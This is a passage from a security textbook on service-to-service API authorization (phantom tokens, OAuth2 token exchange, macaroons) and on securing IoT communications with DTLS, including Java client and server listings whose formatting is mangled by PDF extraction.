introspects  access tokens arriving from external clients. It then replaces the access  token with a short-lived signed JWT containing the same information.  Microservices can then examine the JWT without having to call the AS to  introspect themselves.  DEFINITION In the phantom token pattern, a long-lived opaque access token is validated and then replaced with a short-lived signed JWT at an API gateway. Microservices behind the gateway can examine the JWT without needing to perform an expensive introspection request.   Service API calls in response to user requests  431  The advantage of the phantom token pattern is that microservices behind the gateway don’t need to perform token introspection calls themselves. Because the JWT is short- lived, typically with an expiry time measured in seconds or minutes at most, there is no need for those microservices to check for revocation. The API gateway can exam- ine the request and reduce the scope and audience of the JWT, limiting the damage that would be done if any backend microservice has been compromised. In principle, if the gateway needs to call five different microservices to satisfy a request, it can create five separate JWTs with scope and audience appropriate to each request. This ensures the principle of least privilege is respected and reduces the risk if any one of those ser- vices is compromised, but is rarely done due to the extra overhead of creating new JWTs, especially if public key signatures are used.  TIP A network roundtrip within  the same datacenter takes  a minimum  of 0.5ms plus the processing time required by the AS  which may involve data- base  network  requests .  Verifying  a  public  key  signature  varies  from  about 1 10th of this time  RSA-2048 using OpenSSL  to roughly 10 times as long  ECDSA P-521 using Java’s SunEC provider . Verifying a signature also gen- erally  requires  more  CPU  power  than  making  a  network  call,  which  may impact costs.  The  phantom  token  pattern  is  a  neat  balance  of  the  benefits  and  costs  of  opaque access  tokens  compared  to  self-contained  token  formats  like  JWTs.  Self-contained tokens are scalable and avoid extra network roundtrips, but are hard to revoke, while the opposite is true of opaque tokens.  PRINCIPLE Prefer using opaque access tokens and token introspection when tokens cross trust boundaries to ensure timely revocation. Use self-contained short-lived tokens for service calls within a trust boundary, such as between microservices.  The token exchange extension of OAuth2  https:  www.rfc-editor.org rfc rfc8693.html  provides  a  standard  way  for  an  API  gateway  or  other  client  to  exchange  an  access token for a JWT or other security token. As well as allowing the client to request a new token, the AS may also add an act claim to the resulting token that indicates that the service  client  is  acting  on  behalf  of  the  user  that  is  identified  as  the  subject  of  the token. A backend service can then identify both the service client and the user that initiated the request originally from a single access token.  DEFINITION Token exchange should primarily be used for delegation semantics, in which one party acts on behalf of another but both are clearly identified. It can also be used for impersonation, in which the backend service is unable to tell that another party is impersonating the user. You should prefer delega- tion whenever possible because impersonation leads to misleading audit logs and loss of accountability.  11.6.2 OAuth2 token exchange   432  CHAPTER 11 Securing service-to-service APIs  To  request  a  token  exchange,  the  client  makes  a  HTTP  POST  request  to  the  AS’s token endpoint, just as for other authorization grants. The grant_type parameter is set to urn:ietf:params:oauth:grant-type:token-exchange, and the client passes a token representing the user’s initial authority as the subject_token parameter, with a subject_token_type parameter describing the type of token  token exchange allows a variety of tokens to be used, not just access tokens . The client authenticates to the token endpoint using its own credentials and can provide several optional parameters shown in table 11.4. The AS will make an authorization decision based on the sup- plied information and the identity of the subject and the client and then either return a new access token or reject the request.  TIP Although token exchange is primarily intended for service clients, the actor_token  parameter  can  reference  another  user.  For  example,  you  can use  token  exchange  to  allow  administrators  to  access  parts  of  other  users’ accounts without giving them the user’s password. While this can be done, it has obvious privacy implications for your users.  Table 11.4 Token exchange optional parameters  Parameter  Description  resource  audience  The URI of the service that the client intends to access on the user’s  behalf.  The intended audience of the token. This is an alternative to the  resource parameter where the identifier of the target service is  not a URI.  scope  The desired scope of the new access token.  requested_token_type  The type of token the client wants to receive.  actor_token  A token that identifies the party that is acting on behalf of the user.  If not specified, the identity of the client will be used.  actor_token_type  The type of the actor_token parameter.  The  requested_token_type  attribute  allows  the  client  to  request  a  specific  type  of token in the response. The value urn:ietf:params:oauth:token-type:access_token indicates that the client wants an access token, in whatever token format the AS pre- fers,  while  urn:ietf:params:oauth:token-type:jwt  can  be  used  to  request  a  JWT specifically. There are other values defined in the specification, permitting the client to ask for other security token types. In this way, OAuth2 token exchange can be seen as a limited form of security token service.  DEFINITION A security token service  STS  is a service that can translate security tokens from one format to another based on security policies. An STS can be used to bridge security systems that expect different token formats.   Service API calls in response to user requests  433  When  a  backend  service  introspects  the  exchanged  access  token,  they  may  see  a nested chain of act claims, as shown in listing 11.15. As with other access tokens, the sub claim indicates the user on whose behalf the request is being made. Access con- trol  decisions  should  always  be  made  primarily  based  on  the  user  indicated  in  this claim. Other claims in the token, such as roles or permissions, will be about that user. The first act claim indicates the calling service that is acting on behalf of the user. An act claim is itself a JSON claims set that may contain multiple identity attributes about the calling service, such as the issuer of its identity, which may be needed to uniquely identify the service. If the token has passed through multiple services, then there may be further act claims nested inside the first one, indicating the previous services that also acted as the same user in servicing the same request. If the backend service wants to take the service account into consideration when making access control decisions, it should limit this to just the first  outermost  act identity. Any previous act identities are intended only for ensuring a complete audit record.  NOTE Nested act claims don’t indicate that service77 is pretending to be ser- vice16 pretending to be Alice! Think of it as a mask being passed from actor to actor, rather than a single actor wearing multiple layers of masks.  Listing 11.16 An exchanged access token introspection response  {    "aud":"https:  service26.example.com",    "iss":"https:  issuer.example.com",    "exp":1443904100,    "nbf":1443904000,    "sub":"alice@example.com",         "act":                                        {      "sub":"https:  service16.example.com",        "act":                                          {        "sub":"https:  service77.example.com"         }    }  }  The effective user  of the token  The service that is acting  on behalf of the user A previous service that also  acted on behalf of the user  in the same request  Token exchange introduces an additional network roundtrip to the AS to exchange the access token at each hop of servicing a request. It can therefore be more expen- sive than the phantom token pattern and introduce additional latency in a microser- vices architecture. Token exchange is more compelling when service calls cross trust boundaries and latency is less of a concern. For example, in healthcare, a patient may enter the healthcare system and be treated by multiple healthcare providers, each of which needs some level of access to the patient’s records. Token exchange allows one provider to hand off access to another provider without repeatedly asking the patient for consent. The AS decides an appropriate level of access for each service based on configured authorization policies.   434  CHAPTER 11 Securing service-to-service APIs  NOTE When multiple clients and organizations are granted access to user data based on a single consent flow, you should ensure that this is indicated to the user in the initial consent screen so that they can make an informed decision.  Macaroons for service APIs If the scope or authority of a token only needs to be reduced when calling other ser- vices, a macaroon-based access token  chapter 9  can be used as an alternative to token exchange. Recall that a macaroon allows any party to append caveats to the token, restricting what it can be used for. For example, an initial broad-scoped token supplied by a user granting access to their patient records can be restricted with caveats before calling external services, perhaps only to allow access to notes from the last 24 hours. The advantage is that this can be done locally  and efficiently  with- out having to call the AS to exchange the token.  A common use of service credentials is for a frontend API to make calls to a backend database. The frontend API typically has a username and password that it uses to connect, with privileges to perform a wide range of operations. If instead the data- base used macaroons for authorization, it could issue a broadly privileged macaroon to the frontend service. The frontend service can then append caveats to the maca- roon and reissue it to its own API clients and ultimately to users. For example, it might append a caveat user = "mary" to a token issued to Mary so that she can only read her own data, and an expiry time of 5 minutes. These constrained tokens can then be passed all the way back to the database, which can enforce the caveats. This was the approach adopted by the Hyperdex database  http:  mng.bz gg1l . Very few data- bases support macaroons today, but in a microservice architecture you can use the same techniques to allow more flexible and dynamic access control.

Summary  435  Answers to pop quiz questions  1 d  and  e.  API  keys  identify  services,  external  organizations,  or  businesses  that need to call your API. An API key may have a long expiry time or never expire, while user tokens typically expire after minutes or hours.  2 e. 3 e. Client credentials and service account authentication can use the same mecha- nisms;  the  primary  benefit  of  using  a  service  account  is  that  clients  are  often stored in a private database that only the AS has access to.

A signed or encrypted JWT is an effective API key. When used to authenticate a client, this is known as JWT bearer authentication.   OAuth2 supports service-to-service API calls through the client credentials grant  type that allows a client to obtain an access token under its own authority.   A  more  flexible  alternative  to  the  client  credentials  grant  is  to  create  service accounts which act like regular user accounts but are intended for use by services. Service  accounts  should  be  protected  with  strong  authentication  mechanisms because they often have elevated privileges compared to normal accounts.   The JWT bearer grant type can be used to obtain an access token for a service account using a JWT. This can be used to deploy short-lived JWTs to services   436  CHAPTER 11 Securing service-to-service APIs  when they start up that can then be exchanged for access and refresh tokens. This avoids leaving long-lived, highly-privileged credentials on disk where they might be accessed.   TLS client certificates can be used to provide strong authentication of service clients.  Certificate-bound  access  tokens  improve  the  security  of  OAuth2  and prevent token theft and misuse.   Kubernetes  includes  a  simple  method  for  distributing  credentials  to  services, but it suffers from some security weaknesses. Secret vaults and key management services provide better security but need an initial credential to access. A short- lived JWT can provide this initial credential with the least risk.    When  service-to-service  API  calls  are  made  in  response  to  user  requests,  care should be taken to avoid confused deputy attacks. To avoid this, the original user identity should be communicated to backend services. The phantom token pat- tern provides an efficient way to achieve this in a microservice architecture, while OAuth2 token exchange and macaroons can be used across trust boundaries.   Part 5  APIs for the Internet of Things  This final part of the book deals with securing APIs in one of the most chal-  lenging environments: the Internet of Things  IoT . IoT devices are often lim- ited in processing power, battery life, and other physical characteristics, making it difficult to apply many of the techniques from earlier in the book. In this part, you’ll  see  how  to  adapt  techniques  to  be  more  suitable  for  such  constrained devices.   Chapter 12 begins with a look at the crucial issue of securing communica- tions between devices and APIs. You’ll see how transport layer security can be adapted  to  device  communication  protocols  using  DTLS  and  pre-shared  keys. Securing communications from end to end when requests and responses must pass over multiple different transport protocols is the focus of the second half of the chapter.    Chapter  13  concludes  the  book  with  a  discussion  of  authentication  and authorization techniques for IoT APIs. It discusses approaches to avoid replay attacks and other subtle security issues and concludes with a look at handling authorization when a device is offline.       Securing IoT communications  This chapter covers  Securing IoT communications with Datagram TLS  Choosing appropriate cryptographic algorithms for   constrained devices   Implementing end-to-end security for IoT APIs  Distributing and managing device keys  So far, all the APIs you’ve looked at have been running on servers in the safe con- fines of a datacenter or server room. It’s easy to take the physical security of the API hardware for granted, because the datacenter is a secure environment with restricted access and decent locks on the doors. Often only specially vetted staff are allowed into the server room to get close to the hardware. Traditionally, even the clients of an API could be assumed to be reasonably secure because they were desktop PCs installed  in  an  office  environment.  This  has  rapidly  changed  as  first  laptops  and then smartphones have moved API clients out of the office environment. The inter- net  of  things   IoT   widens  the  range  of  environments  even  further,  especially  in industrial or agricultural settings where devices may be deployed in remote envi- ronments with little physical protection or monitoring. These IoT devices talk to APIs in messaging services to stream sensor data to the cloud and provide APIs of  439   440  CHAPTER 12 Securing IoT communications  12.1 Transport layer security  their own to allow physical actions to be taken, such as adjusting machinery in a water treatment plant or turning off the lights in your home or office. In this chapter, you’ll see how to secure the communications of IoT devices when talking to each other and to  APIs  in  the  cloud.  In  chapter  13,  we’ll  discuss  how  to  secure  APIs  provided  by devices themselves.  DEFINITION The internet of things  IoT  is the trend for devices to be connected to the internet to allow easier management and communication. Consumer IoT refers to personal devices in the home being connected to the internet, such as a refrigerator that automatically orders more beer when you run low. IoT techniques are also applied in industry under the name industrial IoT  IIoT .  In a traditional API environment, securing the communications between a client and a server is almost always based on TLS. The TLS connection between the two parties is likely to be end-to-end  or near enough  and using strong authentication and encryp- tion algorithms. For example, a client making a request to a REST API can make a HTTPS connection directly to that API and then largely assume that the connection is secure. Even when the connection passes through one or more proxies, these typically just set up the connection and then copy encrypted bytes from one socket to another. In the IoT world, things are more complicated for many reasons:   The IoT device may be constrained, reducing its ability to execute the public key cryptography  used  in  TLS.  For  example,  the  device  may  have  limited  CPU power and memory, or may be operating purely on battery power that it needs to conserve.   For efficiency, devices often use compact binary formats and low-level network- ing based on  UDP  rather than high-level  TCP-based protocols such  as HTTP and TLS.   A variety of protocols may be used to transmit a single message from a device to its  destination,  from  short-range  wireless  protocols  such  as  Bluetooth  Low Energy  BLE  or Zigbee, to messaging protocols like MQTT or XMPP. Gateway devices can translate messages from one protocol to another, as shown in fig- ure 12.1, but need to decrypt the protocol messages to do so. This prevents a simple end-to-end TLS connection being used.   Some  commonly  used  cryptographic  algorithms  are  difficult  to  implement securely  or  efficiently  on  devices  due  to  hardware  constraints  or  new  threats from physical attackers that are less applicable to server-side APIs.  DEFINITION A  constrained  device  has  significantly  reduced  CPU  power,  mem- ory,  connectivity,  or  energy  availability  compared  to  a  server  or  traditional API client machine. For example, the memory available to a device may be measured in kilobytes compared to the gigabytes often now available to most servers and even smartphones. RFC 7228  https:  tools.ietf.org html rfc7228  describes common ways that devices are constrained.   Transport layer security  441  The sensor broadcasts data to a local gateway over Bluetooth Low-Energy  BLE .  Sensor  BLE  Gateway  Gateway  MQTT  Gateways convert messages from one protocol to another.  HTTP  Cloud service  Figure 12.1 Messages from IoT  devices are often translated from one  protocol to another. The original device  may use low-power wireless networking  such as Bluetooth Low-Energy  BLE  to  communicate with a local gateway that  retransmits messages using application  protocols such as MQTT or HTTP.   In this section, you’ll learn about how to secure IoT communications at the transport layer and the appropriate choice of algorithms for constrained devices.  TIP There are several TLS libraries that are explicitly designed for IoT appli- cations, such as ARM’s mbedTLS  https:  tls.mbed.org , WolfSSL  https:  www .wolfssl.com , and BearSSL  https:  bearssl.org .  12.1.1 Datagram TLS  TLS  is  designed  to  secure  traffic  sent  over  TCP   Transmission  Control  Protocol , which is a reliable stream-oriented protocol. Most application protocols in common use, such as HTTP, LDAP, or SMTP  email , all use TCP and so can use TLS to secure the connection. But a TCP implementation has some downsides when used in con- strained IoT devices, such as the following:   A TCP implementation is complex and requires a lot of code to implement cor- rectly. This code takes up precious space on the device, reducing the amount of code available to implement other functions.   TCP’s  reliability  features  require  the  sending  device  to  buffer  messages  until they have been acknowledged by the receiver, which increases storage require- ments.  Many  IoT  sensors  produce  continuous  streams  of  real-time  data,  for which it doesn’t make sense to retransmit lost messages because more recent data will already have replaced it.   A standard TCP header is at least 16 bytes long, which can add quite a lot of  overhead to short messages.   TCP is unable to use features such as multicast delivery that allow a single mes- sage to be sent to many devices at once. Multicast can be much more efficient than sending messages to each device individually.   442  CHAPTER 12 Securing IoT communications   IoT  devices  often  put  themselves  into  sleep  mode  to  preserve  battery  power when  not  in  use.  This  causes  TCP  connections  to  terminate  and  requires  an expensive TCP handshake to be performed to re-establish the connection when the device wakes. Alternatively, the device can periodically send keep-alive mes- sages to keep the connection open, at the cost of increased battery and band- width usage.  Many protocols used in the IoT instead opt to build on top of the lower-level User Datagram Protocol  UDP , which is much simpler than TCP but provides only con- nectionless and unreliable delivery of messages. For example, the Constrained Applica- tion Protocol  CoAP , provides an alternative to HTTP for constrained devices and is based on UDP. To protect these protocols, a variation of TLS known as Datagram TLS  DTLS  has been developed.1  DEFINITION Datagram  Transport  Layer  Security   DTLS   is  a  version  of  TLS designed to work with connectionless UDP-based protocols rather than TCP- based ones. It provides the same protections as TLS, except that packets may be reordered or replayed without detection.  Recent  DTLS  versions  correspond  to  TLS  versions;  for  example,  DTLS  1.2  corre- sponds to TLS 1.2 and supports similar cipher suites and extensions. At the time of writing, DTLS 1.3 is just being finalized, which corresponds to the recently standard- ized TLS 1.3.  QUIC A middle ground between TCP and UDP is provided by Google’s QUIC protocol  Quick UDP Internet Connections; https:  en.wikipedia.org wiki QUIC , which will form the basis of the next version of HTTP: HTTP 3. QUIC layers on top of UDP but provides many of the same reliability and congestion control features as TCP. A key feature of QUIC is that it integrates TLS 1.3 directly into the transport protocol, reducing the overhead of the TLS handshake and ensuring that low-level protocol features also benefit from security protections. Google has already deployed QUIC into production, and around 7% of Internet traffic now uses the protocol.  QUIC was originally designed to accelerate Google’s traditional web server HTTPS traffic, so compact code size was not a primary objective. However, the protocol can offer significant advantages to IoT devices in terms of reduced network usage and low-latency connections. Early experiments such as an analysis from Santa Clara Uni- versity   http:  mng.bz X0WG   and  another  by  NetApp   https:  eggert.org papers  2020-ndss-quic-iot.pdf  suggest that QUIC can provide significant savings in an IoT context, but the protocol has not yet been published as a final standard. Although not yet  achieving  widespread  adoption  in  IoT  applications,  it’s  likely  that  QUIC  will become increasingly important over the next few years.  1 DTLS is limited to securing unicast UDP connections and can’t secure multicast broadcasts currently.   Transport layer security  443  Although Java supports DTLS, it only does so in the form of the low-level SSLEngine class, which implements the raw protocol state machine. There is no equivalent of the high-level SSLSocket class that is used by normal  TCP-based  TLS, so you must do some  of  the  work  yourself.  Libraries  for  higher-level  protocols  such  as  CoAP  will handle much of this for you, but because there are so many protocols used in IoT applications, in the next few sections you’ll learn how to manually add DTLS to a UDP-based protocol.  NOTE The code  examples  in  this  chapter continue to  use  Java  for  consis- tency. Although Java is a popular choice on more capable IoT devices and gateways, programming constrained devices is more often performed in C or  another  language  with  low-level  device  support.  The  advice  on  secure configuration of DTLS and other protocols in this chapter is applicable to all languages and DTLS libraries. Skip ahead to section 12.1.2 if you are not using Java.  IMPLEMENTING A DTLS CLIENT To begin a DTLS handshake in Java, you first create an SSLContext object, which indi- cates how to authenticate the connection. For a client connection, you initialize the context  exactly  like  you  did  in  section  7.4.2  when  securing  the  connection  to  an OAuth2 authorization server, as shown in listing 12.1. First, obtain an SSLContext for DTLS  by  calling  SSLContext.getInstance "DTLS" .  This  will  return  a  context  that allows DTLS connections with any supported protocol version  DTLS 1.0 and DTLS 1.2  in  Java  11 .  You  can  then  load  the  certificates  of  trusted  certificate  authorities  CAs  and use this to initialize a TrustManagerFactory, just as you’ve done in previ- ous  chapters.  The  TrustManagerFactory  will  be  used  by  Java  to  determine  if  the server’s certificate is trusted. In this, case you can use the as.example.com.ca.p12 file that you created in chapter 7 containing the mkcert CA certificate. The PKIX  Public Key Infrastructure with X.509  trust manager factory algorithm should be used. Finally, you can initialize the SSLContext object, passing in the trust managers from the factory, using the SSLContext.init   method. This method takes three arguments:   An array of KeyManager objects, which are used if performing client certificate authentication  covered in chapter 11 . Because this example doesn’t use client certificates, you can leave this null.   The array of TrustManager objects obtained from the TrustManagerFactory.  An optional SecureRandom object to use when generating random key material and other data during the TLS handshake. You can leave this null in most cases to let Java choose a sensible default.  Create a new file named DtlsClient.java in the src main com manning apisecurity- inaction folder and type in the contents of the listing.  NOTE The  examples  in  this section  assume you are  familiar with UDP  net- work programming in Java. See http:  mng.bz yr4G for an introduction.   444  CHAPTER 12 Securing IoT communications  Listing 12.1 The client SSLContext  package com.manning.apisecurityinaction;  import javax.net.ssl.*; import java.io.FileInputStream; import java.nio.file.*; import java.security.KeyStore; import org.slf4j.*; import static java.nio.charset.StandardCharsets.UTF_8;  public class DtlsClient {     private static final Logger logger =          LoggerFactory.getLogger DtlsClient.class ;     private static SSLContext getClientContext   throws Exception {         var sslContext = SSLContext.getInstance "DTLS" ;           Create an  SSLContext  for DTLS.  Load the trusted CA certificates as a keystore.          var trustStore = KeyStore.getInstance "PKCS12" ;                        trustStore.load new FileInputStream "as.example.com.ca.p12" ,                   "changeit".toCharArray   ;                               Initialize a Trust- ManagerFactory with the trusted certificates.          var trustManagerFactory = TrustManagerFactory.getInstance                     "PKIX" ;                                                      trustManagerFactory.init trustStore ;                                  sslContext.init null, trustManagerFactory.getTrustManagers  ,                   null ;                                                          return sslContext;     } }  Initialize the SSLContext with the trust manager.  After you’ve created the SSLContext, you can use the createEngine   method on it to create a new SSLEngine object. This is the low-level protocol implementation that is normally hidden by higher-level protocol libraries like the HttpClient class you used in chapter 7. For a client, you should pass the address and port of the server to the method when creating the engine and configure the engine to perform the client side of the DTLS handshake by calling setUseClientMode true , as shown in the follow- ing example.  NOTE You  don’t  need  to  type  in  this  example   and  the  other  SSLEngine examples , because I have provided a wrapper class that hides some of this complexity and demonstrates correct use of the SSLEngine. See http:  mng .bz Mo27. You’ll use that class in the example client and server shortly.  var address = InetAddress.getByName "localhost" ; var engine = sslContext.createEngine address, 54321 ; engine.setUseClientMode true ;  You should then allocate buffers for sending and receiving network packets, and for holding application data. The SSLSession associated with an engine has methods that provide hints for the correct size of these buffers, which you can query to ensure you   Transport layer security  445  allocate  enough  space,  as  shown  in  the  following  example  code   again,  you  don’t need to type this in :  Retrieve the SSLSession  from the engine.  var session = engine.getSession  ;       var receiveBuffer =                                                 ByteBuffer.allocate session.getPacketBufferSize   ;         var sendBuffer =                                                    ByteBuffer.allocate session.getPacketBufferSize   ;         var applicationData =                                               ByteBuffer.allocate session.getApplicationBufferSize   ;     Use the session  hints to correctly  size the data  buffers.  These  initial  buffer  sizes  are  hints,  and  the  engine  will  tell  you  if  they  need  to  be resized as you’ll see shortly. Data is moved between buffers by using the following two method calls, also illustrated in figure 12.2:   sslEngine.wrap appData, sendBuf  causes the SSLEngine to consume any wait- ing  application  data  from  the  appData  buffer  and  write  one  or  more  DTLS packets into the network sendBuf that can then be sent to the other party.  Unwrap operations consume received data from the network and produce decrypted application data.

Figure 12.2 The SSLEngine uses two methods to move data between the  application and network buffers: wrap   consumes application data to send  and writes DTLS packets into the send buffer, while unwrap   consumes data  from the receive buffer and writes unencrypted application data back into the  application buffer.   446  CHAPTER 12 Securing IoT communications   sslEngine.unwrap recvBuf,  appData   instructs  the  SSLEngine  to  consume received DTLS packets from the recvBuf and output any decrypted application data into the appData buffer.  To start the DTLS handshake, call sslEngine.beginHandshake  . Rather than block- ing until the handshake is complete, this configures the engine to expect a new DTLS handshake to begin. Your application code is then responsible for polling the engine to determine the next action to take and sending or receiving UDP messages as indi- cated by the engine.    To poll the engine, you call the sslEngine.getHandshakeStatus   method, which  returns one of the following values, as shown in figure 12.3:   NEED_UNWRAP indicates that the engine is waiting to receive a new message from the server.

The NEED_WRAP state occurs when the SSLEngine needs to send data to the network. Call wrap   to ﬁll the send buffer and then send it.  Figure 12.3 The SSLEngine handshake state machine involves four main states. In the NEED_UNWRAP  and NEED_UNWRAP_AGAIN states, you should use the unwrap   call to supply it with received  network data. The NEED_WRAP state indicates that new DTLS packets should be retrieved with the  wrap   call and then sent to the other party. The NEED_TASK state is used when the engine needs  to execute expensive cryptographic functions.

You  should  immediately  call  the  unwrap    method  again  with  an empty input buffer to process the message. This can happen if multiple DTLS records arrived in a single UDP packet.   NEED_WRAP indicates that the engine needs to send a message to the server. The application should call the  wrap   method with an output buffer that will be filled with the new DTLS message, which your application should then send to the server.   NEED_TASK indicates that the engine needs to perform some  potentially expen- sive  processing, such as performing cryptographic operations. You can call the getDelegatedTask    method  on  the  engine  to  get  one  or  more  Runnable objects to execute. The method returns null when there are no more tasks to run. You can either run these immediately, or you can run them using a back- ground  thread  pool  if  you  don’t  want  to  block  your  main  thread  while  they complete.   FINISHED indicates that the handshake has just finished, while NOT_HANDSHAK- ING indicates that no handshake is currently in progress  either it has already finished or has not been started . The FINISHED status is only generated once by  the last  call  to  wrap    or  unwrap   and  then  the  engine will  subsequently produce a NOT_HANDSHAKING status.  Listing  12.2  shows  the  outline  of  how  the basic  loop  for  performing  a  DTLS  hand- shake with SSLEngine is performed based on the handshake status codes.  NOTE This  listing  has  been  simplified  compared  to  the  implementation  in the GitHub repository accompanying the book, but the core logic is correct.  Listing 12.2 SSLEngine handshake loop  engine.beginHandshake  ;        Trigger a new DTLS  handshake.  Allocate buffers  for network and  application data.  Loop until the  handshake is finished.  var handshakeStatus = engine.getHandshakeStatus  ;      while  handshakeStatus != HandshakeStatus.FINISHED  {           SSLEngineResult result;     switch  handshakeStatus  {         case NEED_UNWRAP:                                  if  recvBuf.position   == 0  {                     channel.receive recvBuf ;                  }                                          case NEED_UNWRAP_AGAIN:                  result = engine.unwrap recvBuf.flip  , appData ;                 recvBuf.compact  ;                                               checkStatus result.getStatus   ;                                handshakeStatus = result.getHandshakeStatus  ;                  break;  In the NEED_UNWRAP state, you  should wait for a network packet  if not already received.  Let the switch statement fall through to the NEED_UNWRAP _AGAIN case.  Process any received DTLS packets by calling engine.unwrap  .  Check the result  status of the unwrap    call and update the  handshake state.   448  CHAPTER 12 Securing IoT communications          case NEED_WRAP:             result = engine.wrap appData.flip  , sendBuf ;                  appData.compact  ;                                              channel.write sendBuf.flip   ;                                  sendBuf.compact  ;                                              checkStatus result.getStatus   ;                                handshakeStatus = result.getHandshakeStatus  ;                  break;                                                      case NEED_TASK:             Runnable task;                                                     while   task = engine.getDelegatedTask    != null  {                   task.run  ;                                                    }                                                                  status = engine.getHandshakeStatus  ;                          default:             throw new IllegalStateException  ; }  For NEED_TASK, just run any delegated tasks or submit them to a thread pool.  In the  NEED_WRAP  state, call the  wrap   method  and then send  the resulting  DTLS packets.  The wrap   and unwrap   calls return a status code for the operation as well as a new handshake  status,  which  you  should  check  to  ensure  that  the  operation  completed correctly. The possible status codes are shown in table 12.1. If you need to resize a buf- fer, you can query the current SSLSession to determine the recommended applica- tion  and  network  buffer  sizes  and  compare  that  to  the  amount  of  space  left  in  the buffer. If the buffer is too small, you should allocate a new buffer and copy any exist- ing data into the new buffer. Then retry the operation again.  Table 12.1 SSLEngine operation status codes  Status code  Meaning  OK  The operation completed successfully.  BUFFER_UNDERFLOW  The operation failed because there was not enough input data. Check that the  input buffer has enough space remaining. For an unwrap operation, you should  receive another network packet if this status occurs.   BUFFER_OVERFLOW  The operation failed because there wasn’t enough space in the output buffer.  Check that the buffer is large enough and resize it if necessary.  CLOSED  The other party has indicated that they are closing the connection, so you  should process any remaining packets and then close the SSLEngine too.   Using the DtlsDatagramChannel class from the GitHub repository accompanying the book, you can now implement a working DTLS client example application. The sam- ple class requires that the underlying UDP channel is connected before the DTLS hand- shake  occurs.  This  restricts  the  channel  to  send  packets  to  only  a  single  host  and receive packets from only that host too. This is not a limitation of DTLS but just a sim- plification made to keep the sample code short. A consequence of this decision is that the server that you’ll develop in the next section can only handle a single client at a time and will discard packets from other clients. It’s not much harder to handle con- current clients but you need to associate a unique SSLEngine with each client.   Transport layer security  449  DEFINITION A  UDP  channel   or  socket   is  connected  when  it  is  restricted  to only  send  or  receive  packets  from  a  single  host.  Using  connected  channels simplifies programming and can be more efficient, but packets from other cli- ents will be silently discarded. The connect   method is used to connect a Java DatagramChannel.  Listing 12.3 shows a sample client that connects to a server and then sends the con- tents of a text file line by line. Each line is sent as an individual UDP packet and will be encrypted using DTLS. After the packets are sent, the client queries the SSLSession to print out the DTLS cipher suite that was used for the connection. Open the Dtls- Client.java file you created earlier and add the main method shown in the listing. Cre- ate a text file named test.txt in the root folder of the project and add some example text to it, such as lines from Shakespeare, your favorite quotes, or anything you like.  NOTE You won’t be able to use this client until you write the server to accom- pany it in the next section.  Listing 12.3 The DTLS client  Open the DTLS channel with  the client SSLContext.  Open a text file to send to the server.  public static void main String... args  throws Exception {     try  var channel = new DtlsDatagramChannel getClientContext   ;             var in = Files.newBufferedReader Paths.get "test.txt"    {            logger.info "Connecting to localhost:54321" ;         channel.connect "localhost", 54321 ;     Connect to the server running on  the local machine and port 54321.  Send the lines of text to the server.          String line;         while   line = in.readLine    != null  {                              logger.info "Sending packet to server: {}", line ;                channel.send line.getBytes UTF_8  ;                           }          logger.info "All packets sent" ;         logger.info "Used cipher suite: {}",                                channel.getSession  .getCipherSuite   ;         } }  Print details of the  DTLS connection.  After the client completes, it will automatically close the DtlsDatagramChannel, which will trigger shutdown of the associated  SSLEngine object. Closing a DTLS session is not  as  simple  as  just  closing  the  UDP  channel,  because  each  party  must  send  each other  a  close-notify  alert  message  to  signal  that  the  DTLS  session  is  being  closed.  In Java, the process is similar to the handshake loop that you saw earlier in listing 12.2. First, the client should indicate that it will not send any more packets by calling the closeOutbound   method on the engine. You should then call the wrap   method to allow the engine to produce the close-notify alert message and send that message to the server, as shown in listing 12.4. Once the alert has been sent, you should process incoming messages until you receive a corresponding close-notify from the server, at   450  CHAPTER 12 Securing IoT communications  which point the  SSLEngine will return true from the isInboundDone   method and you can then close the underlying UDP DatagramChannel.   If the other side closes the channel first, then the next call to unwrap   will return a CLOSED status. In this case, you should reverse the order of operations: first close the inbound side and process any received messages and then close the outbound side and send your own close-notify message.   Listing 12.4 Handling shutdown  public void close   throws IOException {     sslEngine.closeOutbound  ;                    sslEngine.wrap appData.flip  , sendBuf ;        appData.compact  ;                              channel.write sendBuf.flip   ;                  sendBuf.compact  ;                           Indicate that no further outbound  application packets will be sent.  Call wrap   to generate the  close-notify message and  send it to the server.      while  !sslEngine.isInboundDone    {                      channel.receive recvBuf ;                             sslEngine.unwrap recvBuf.flip  , appData ;            recvBuf.compact  ;                                }     sslEngine.closeInbound  ;         channel.close  ;              }   Indicate that the inbound  side is now done too and  close the UDP channel.  Wait until a close- notify is received  from the server.  IMPLEMENTING A DTLS SERVER Initializing a SSLContext for a server is similar to the client, except in this case you use a KeyManagerFactory to supply the server’s certificate and private key. Because you’re not using client certificate authentication, you can leave the  TrustManager array as  null. Listing 12.5 shows the code for creating a server-side DTLS context. Create a new file named DtlsServer.java next to the client and type in the contents of the listing.  Listing 12.5 The server SSLContext  package com.manning.apisecurityinaction;  import java.io.FileInputStream; import java.nio.ByteBuffer; import java.security.KeyStore; import javax.net.ssl.*; import org.slf4j.*;  import static java.nio.charset.StandardCharsets.UTF_8;  public class DtlsServer {     private static SSLContext getServerContext   throws Exception {         var sslContext = SSLContext.getInstance "DTLS" ;         Load the server’s certificate and private key from a keystore.          var keyStore = KeyStore.getInstance "PKCS12" ;                 keyStore.load new FileInputStream "localhost.p12" ,                    "changeit".toCharArray   ;                      Create a DTLS  SSLContext  again.   Transport layer security  451  Initialize the KeyManager- Factory with the keystore.          var keyManager = KeyManagerFactory.getInstance "PKIX" ;             keyManager.init keyStore, "changeit".toCharArray   ;                 sslContext.init keyManager.getKeyManagers  , null, null ;             return sslContext;     } }  Initialize the SSLContext with the key manager.  In this example, the server will be running on localhost, so use mkcert to generate a key pair and signed certificate if you don’t already have one, by running2  mkcert -pkcs12 localhost  in the root folder of the project. You can then implement the DTLS server as shown in listing 12.6. Just as in the client example, you can use the DtlsDatagramChannel class to simplify the handshake. Behind the scenes, the same handshake process will occur, but the order of wrap   and unwrap   operations will be different due to the different roles played in the handshake. Open the DtlsServer.java file you created earlier and add the main method shown in the listing.  NOTE The DtlsDatagramChannel provided in the GitHub repository accom- panying the book will automatically connect the underlying DatagramChannel to the first client that it receives a packet from and discard packets from other clients until that client disconnects.  Listing 12.6 The DTLS server  public static void main String... args  throws Exception {     try  var channel = new DtlsDatagramChannel getServerContext     {            channel.bind 54321 ;                                                     logger.info "Listening on port 54321" ;  Allocate a buffer  for data received  from the client.          var buffer = ByteBuffer.allocate 2048 ;        Receive decrypted UDP  packets from the client.          while  true  {             channel.receive buffer ;                     buffer.flip  ;             var data = UTF_8.decode buffer .toString  ;                 logger.info "Received: {}", data ;                          buffer.compact 